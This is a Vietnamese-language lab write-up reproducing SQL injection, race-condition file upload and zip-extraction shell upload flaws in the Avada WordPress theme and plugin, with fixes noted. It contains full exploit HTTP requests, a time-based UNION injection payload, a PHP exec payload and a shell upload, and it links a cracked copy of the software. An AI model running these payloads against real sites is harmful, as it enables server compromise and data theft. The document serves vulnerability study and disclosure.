# Multiple High and Critical Vulnerabilities in Avada Theme and Plugin

![Alt text](./images/image.png)

- Nhiều lỗ hổng nghiêm trọng tồn tại trong Avada Theme <= 7.11.1 và Avada Builder plugin <= 3.11.1

![Alt text](./images/image-1.png)

### Setup
- Avada Theme 7.8.2
- Avada Builder plugin 3.8.2
- Theme và plugin crack ở đây
[Source](avada.zip)


- Thêm mới theme
![Alt text](./images/image-4.png)
- Như này là được 
![Alt text](./images/image-5.png)
- Thêm mới plugin và add mới
![Alt text](./images/image-2.png)
![Alt text](./images/image-3.png)

## I. Authenticated SQL Injection in Plugin
- Enable Critical CSS để sử dụng được action trong ajax-admin
- Vào Options > Performance > Enable Critical CSS (On) > Save Changes

![Alt text](./images/image-6.png)

![Alt text](./images/image-7.png)

- Generate Critical Css

![Alt text](./images/image-8.png)
- Ảnh là đặt var_dump() vào \$query cho dễ debug

- Lỗ hổng tại hàm wp-content/plugins/fusion-builder/inc/critical-css/class-awb-critical-css-page.php, function ajax_regenerate_css()

- Phần khởi tạo có add action để gọi ajax-admin nhưng cần phải xác thực.

```php
public function __construct() {
    add_action( 'admin_menu', [ $this, 'add_menu_page' ], 12 );
    add_action( 'wp_ajax_awb_search_query', [ $this, 'search_query' ] );
    add_action( 'wp_ajax_awb_critical_new', [ $this, 'ajax_get_urls' ] );
    add_action( 'wp_ajax_awb_bulk_update_css', [ $this, 'ajax_get_bulk_urls' ] );
    add_action( 'wp_ajax_awb_critical_css', [ $this, 'ajax_save_css' ] );
    add_action( 'wp_ajax_awb_regenerate_critical_css', [ $this, 'ajax_regenerate_css' ] );

    if ( is_admin() ) {
        $this->bulk_actions();
    }
}
```

![Alt text](./images/image-9.png)

- Id được lấy từ \$_GET['awb_critical_id']
```php
$id = sanitize_text_field( wp_unslash( $_GET['awb_critical_id'] ) );

$entry = AWB_Critical_CSS()->get(
    [
        'where' => [
            'id' => '"' . $id . '"',
        ],
    ]
);
```

- Hàm get() chỉ thêm một số truy vấn điều kiện chứ không làm sạch biến id.
```php
public function get( $args = [] ) {
    global $wpdb;

    $defaults = [
        'what'     => '*',
        'where'    => [],
        'order_by' => '',
        'order'    => 'ASC',
        'limit'    => '',
        'offset'   => 0,
    ];
    $args     = wp_parse_args( $args, $defaults );

    // The table name.
    $table_name = $wpdb->prefix . $this->table_name;

    // The query basics.
    $query = 'SELECT ' . $args['what'] . " FROM `$table_name`";


    // Build the WHERE fragment of the query.
    if ( ! empty( $args['where'] ) ) {
        $where = [];
        foreach ( $args['where'] as $where_fragment_key => $where_fragment_val ) {
            if ( false === strpos( $where_fragment_val, 'LIKE' ) ) {
                $where[] = "$where_fragment_key = $where_fragment_val";
            } else {
                $where[] = "$where_fragment_key $where_fragment_val";
            }
        }

        $query .= ' WHERE ' . implode( ' AND ', $where );
    }

    // Build the ORDER BY fragment of the query.
    if ( '' !== $args['order_by'] ) {
        $order  = 'ASC' !== strtoupper( $args['order'] ) ? 'DESC' : 'ASC';
        $query .= ' ORDER BY ' . $args['order_by'] . ' ' . $order;
    }

    // Build the LIMIT fragment of the query.
    if ( '' !== $args['limit'] ) {
        $query .= ' LIMIT ' . absint( $args['limit'] );
    }

    // Build the OFFSET fragment of the query.
    if ( 0 !== $args['offset'] ) {
        $query .= ' OFFSET ' . absint( $args['offset'] );
    }

    var_dump($query);


    return $wpdb->get_results( $query ); // phpcs:ignore WordPress.DB
}
```

- Thực hiện union attack với time delay
![Alt text](./images/image-10.png)

- Payload
```php
GET /wordpress/wp-admin/admin-ajax.php?action=awb_regenerate_critical_css&awb_critical_id=1"+union+select+sleep(10),null,null,null,null,null,null+--+- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694158744%7ClXVo7CI92RXup6lamCqGhl5mFyfqJiXHPX76FpS5I1U%7C0410ef2aa5cf0ac12660fdc07e85b9a838625dd2eb0d76af3a787f062c052b55; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694158744%7ClXVo7CI92RXup6lamCqGhl5mFyfqJiXHPX76FpS5I1U%7C8d15e3344ff93c6bea2bb124dd6ee0b8c2ca31f4b621fba30bac4127b1f32231; wp-settings-time-1=1693985946; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244
Connection: close

```

- Ở hàm wp-content/plugins/fusion-builder/inc/critical-css/class-awb-critical-css-page.php, function ajax_save_css() cũng tồn tại lỗ hổng sqli tương tự.

![Alt text](./images/image-11.png)

- Có thể sử dụng sqlmap để dump

![Alt text](./images/image14.png)

#### Giải pháp
- Cách phòng chống sqli đơn giản cho id là ép kiểu về định dạng muốn.
- Dùng intval() để ép thành kiểu nguyên
![Alt text](./images/image-12.png)

- Dùng esc_sql() của wordpress để escape dấu nháy thành 1 phần của truy vấn và không thể thoát ra câu truy vấn.
![Alt text](./images/image-13.png)

## II. Contributor+ Arbitrary File Upload
- Người dùng có thể upload file bất kỳ lên hệ thống.
- Lỗ hổng chức năng file upload tồn tại ở wp-content/themes/Avada/includes/avada-app/class-fusion-panel.php, function ajax_import_options()

![Alt text](./images/image15.png)
```php
public function ajax_import_options() {
		check_ajax_referer( 'fusion_load_nonce', 'fusion_load_nonce' );
		$wp_filesystem = Fusion_Helper::init_filesystem();
		$upload_dir    = wp_upload_dir();
		$dir_path      = wp_normalize_path( trailingslashit( $upload_dir['basedir'] ) . 'fusion-page-options-export/' );
		$dir_url       = trailingslashit( $upload_dir['baseurl'] ) . 'fusion-page-options-export/';
		$content_json  = false;

		// If its an uploaded file.
		if ( isset( $_FILES['po_file_upload'] ) ) {
			if ( ! isset( $_FILES['po_file_upload']['name'] ) ) {
				return false;
			}

			$json_file_path = wp_normalize_path( $dir_path . wp_unslash( $_FILES['po_file_upload']['name'] ) ); // phpcs:ignore WordPress.Security.ValidatedSanitizedInput

			if ( ! file_exists( $dir_path ) ) {
				wp_mkdir_p( $dir_path );
			}

			if ( ! isset( $_FILES['po_file_upload'] ) || ! isset( $_FILES['po_file_upload']['tmp_name'] ) ) {
				return false;
			}
			// We're already checking if defined above.
			if ( ! $wp_filesystem->move( wp_normalize_path( $_FILES['po_file_upload']['tmp_name'] ), $json_file_path, true ) ) { // phpcs:ignore WordPress.Security.ValidatedSanitizedInput
				return false;
			}

			$content_json = $wp_filesystem->get_contents( $json_file_path );
            var_dump($json_file_path);
//			$wp_filesystem->delete( $json_file_path );

		} elseif ( isset( $_POST['toUrl'] ) ) {
			$args = [
				'user-agent' => 'avada-user-agent',
			];

			$content_json = wp_remote_retrieve_body( wp_remote_get( esc_url( wp_unslash( $_POST['toUrl'] ) ), $args ) ); // phpcs:ignore WordPress.Security.ValidatedSanitizedInput
		}

		echo wp_json_encode( $content_json );
		die();
	}
```

- Đầu tiên tạo 1 file để upload
```php
<?php
    $nonce = wp_create_nonce('fusion_load_nonce');
?>

<!DOCTYPE html>
<html>
<body>

<form action="http://localhost/wordpress/wp-admin/admin-ajax.php?action=fusion_panel_import" method="post" enctype="multipart/form-data">
     Thêm nonce như một input ẩn
    <input type="hidden" name="fusion_load_nonce" value="<?php echo $nonce; ?>">

    Select image to upload:
    <input type="file" name="po_file_upload" id="fileToUpload">
    <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>

```
- Comment chức năng xoá file và hiện thông tin đường dẫn ra.

![Alt text](./images/image16.png)
- File đã được lưu vào trong server

![Alt text](./images/image17.png)

![Alt text](./images/image18.png)

- Upload thành công

![Alt text](./images/image19.png)

- Thực tế thì sau khi lấy content của file lưu vào biến \$content_json để echo thì sẽ xoá file.

- Nhưng server lại lưu file rồi mới xoá điều này có thể dẫn tới cuộc tấn công upload file race condition để truy cập vào file trước khi nó bị xoá.

![Alt text](./images/image20.png)

![Alt text](./images/image21.png)
src: https://sec.vnpt.vn/2023/05/exploiting-file-upload-vulnerability-with-race-conditions-challenge-for-you/

- Payload

- Request tạo file.
```
POST /wordpress/wp-admin/admin-ajax.php?action=fusion_panel_import&_ajax_nonce=38a87dbf3f HTTP/1.1
Host: localhost
Content-Length: 331
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCW2uNVKVzofQXcnv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/wordpress/file_upload.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C4424ea9d198d605e77bb3dda3b38572bec6aef735bacee774bd20458958a10b2; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C429e15ff3ff283381731bafe13c5110823754a6cc42e036d7590e3a211821d53; wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1694144870; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244; fusionredux_current_tab=83
Connection: close

------WebKitFormBoundaryCW2uNVKVzofQXcnv
Content-Disposition: form-data; name="po_file_upload"; filename="test.php"
Content-Type: application/octet-stream

<?php
exec("calc");
------WebKitFormBoundaryCW2uNVKVzofQXcnv
Content-Disposition: form-data; name="submit"

Upload Image
------WebKitFormBoundaryCW2uNVKVzofQXcnv--
```

- Request truy cập file

```

GET /wordpress/wp-content/uploads/fusion-page-options-export/test.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C429e15ff3ff283381731bafe13c5110823754a6cc42e036d7590e3a211821d53; wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1694144870; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244; fusionredux_current_tab=83
Connection: close

```

- Cho 2 request vào turbo intruder để run.

- Kết quả
![Alt text](./images/image22.png)

- Ở bản vá nhà cung cấp chỉ chấp nhận tải file json.

![Alt text](./images/image23.png)

## III. Author+ Unrestricted Zip Extraction
- Lổ hổng Extract file zip icon khi author import icon.  
- Tạo 1 icon set.

![Alt text](./images/image24.png)
- Upload 1 file zip không phải là icon lên.

![Alt text](./images/image25.png)

- Upload
```
POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 697
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzIACVdvGE66Dww7V
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/wordpress/wp-admin/post.php?post=76&action=edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C4424ea9d198d605e77bb3dda3b38572bec6aef735bacee774bd20458958a10b2; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C429e15ff3ff283381731bafe13c5110823754a6cc42e036d7590e3a211821d53; wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1694144870; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244; fusionredux_current_tab=83
Connection: close

------WebKitFormBoundaryzIACVdvGE66Dww7V
Content-Disposition: form-data; name="name"

flag.zip
------WebKitFormBoundaryzIACVdvGE66Dww7V
Content-Disposition: form-data; name="_ajax_nonce"

f07b5bb954
------WebKitFormBoundaryzIACVdvGE66Dww7V
Content-Disposition: form-data; name="action"

fusion-icons-uploader-action
------WebKitFormBoundaryzIACVdvGE66Dww7V
Content-Disposition: form-data; name="async-upload"; filename="flag.zip"
Content-Type: application/x-zip-compressed

PK---content-file-zip
------WebKitFormBoundaryzIACVdvGE66Dww7V--
```
- Upload file sẽ do fusion-icons-uploader-action xử lý.

![Alt text](./images/image26.png)

- Lỗ hổng tồn tại ở chức năng process_upload tại wp-content/themes/Avada/includes/lib/inc/custom-icons/class-fusion-custom-icon-set.php

```php
---
$package_path = get_attached_file( $icon_set['attachment_id'] );

$status = false;

if ( $package_path && file_exists( $package_path ) ) {
    // Create icon set path.
    $icon_set_dir_name = $this->get_unique_dir_name( pathinfo( $package_path, PATHINFO_FILENAME ), FUSION_ICONS_BASE_DIR );
    $icon_set_path     = FUSION_ICONS_BASE_DIR . $icon_set_dir_name;

    // Create icon set directory.
    wp_mkdir_p( $icon_set_path );

    // Attempt to manually extract the zip file first. Required for fptext method.
    if ( class_exists( 'ZipArchive' ) ) {
        $zip = new ZipArchive();
        if ( true === $zip->open( $package_path ) ) {
            $zip->extractTo( $icon_set_path );
            $zip->close();
            $status = true;
        }
    } else {
        $status = unzip_file( $package_path, $icon_set_path );
    }
}
---
```

- Sau khi kiểm tra xem file zip đã được upload hay không thì kiểm tra xem đường dẫn có tồn tại hay không và đổi tên file. 
- Check các thông tin xong thì sẽ extreact file vào /upload/fusion-icons/

```php
if ( class_exists( 'ZipArchive' ) ) {
    $zip = new ZipArchive();
    if ( true === $zip->open( $package_path ) ) {
        $zip->extractTo( $icon_set_path );
        $zip->close();
        $status = true;
    }
} else {
    $status = unzip_file( $package_path, $icon_set_path );
}
```
- Vì vậy việc upload file zip php sẽ unzip nó và đưa vào uploads có thể truy cập được.

- Upload shell
```
POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 902
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeYEFfSWInvFCB1cE
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/wordpress/wp-admin/post-new.php?post_type=fusion_icons
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C4424ea9d198d605e77bb3dda3b38572bec6aef735bacee774bd20458958a10b2; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C429e15ff3ff283381731bafe13c5110823754a6cc42e036d7590e3a211821d53; wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1694144870; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244; fusionredux_current_tab=83
Connection: close

------WebKitFormBoundaryeYEFfSWInvFCB1cE
Content-Disposition: form-data; name="name"

test.zip
------WebKitFormBoundaryeYEFfSWInvFCB1cE
Content-Disposition: form-data; name="_ajax_nonce"

f07b5bb954
------WebKitFormBoundaryeYEFfSWInvFCB1cE
Content-Disposition: form-data; name="action"

fusion-icons-uploader-action
------WebKitFormBoundaryeYEFfSWInvFCB1cE
Content-Disposition: form-data; name="async-upload"; filename="test.zip"
Content-Type: application/x-zip-compressed

PK-content-zip-shell-file
```

- Request unzip file
```
POST /wordpress/wp-admin/post.php HTTP/1.1
Host: localhost
Content-Length: 993
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://localhost/wordpress/wp-admin/post-new.php?post_type=fusion_icons&wp-post-new-reload=true
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C4424ea9d198d605e77bb3dda3b38572bec6aef735bacee774bd20458958a10b2; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C429e15ff3ff283381731bafe13c5110823754a6cc42e036d7590e3a211821d53; wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1694144870; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244; fusionredux_current_tab=83
Connection: close

_wpnonce=08f02fb466&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost-new.php%3Fpost_type%3Dfusion_icons&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=fusion_icons&original_post_status=auto-draft&referredby=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D76%26action%3Dedit&_wp_original_http_referer=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D76%26action%3Dedit&auto_draft=&post_ID=81&meta-box-order-nonce=02f654687c&closedpostboxesnonce=b3ffe0660d&post_title=test&samplepermalinknonce=40e495fd42&hidden_post_status=draft&post_status=draft&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=09&jj=08&aa=2023&hh=08&mn=57&ss=41&hidden_mm=09&cur_mm=09&hidden_jj=08&cur_jj=08&hidden_aa=2023&cur_aa=2023&hidden_hh=08&cur_hh=08&hidden_mn=57&cur_mn=57&original_publish=%C4%90%C4%83ng&publish=%C4%90%C4%83ng&post_name=&fusion-custom-icons%5Battachment_id%5D=82&fusion-custom-icons-nonce=f07b5bb954
```
![Alt text](./images/image27.png)

![Alt text](./images/image28.png)

- Ở bản patch thì chỉ chấp nhận 1 số tệp zip để thì mới unzip.

![Alt text](./images/image29.png)
# Tham khảo
- https://patchstack.com/articles/multiple-high-and-critical-vulnerabilities-in-avada-theme-and-plugin/#:~:text=The%20Avada%20theme%20itself%20also,execution%20on%20the%20WordPress%20site.
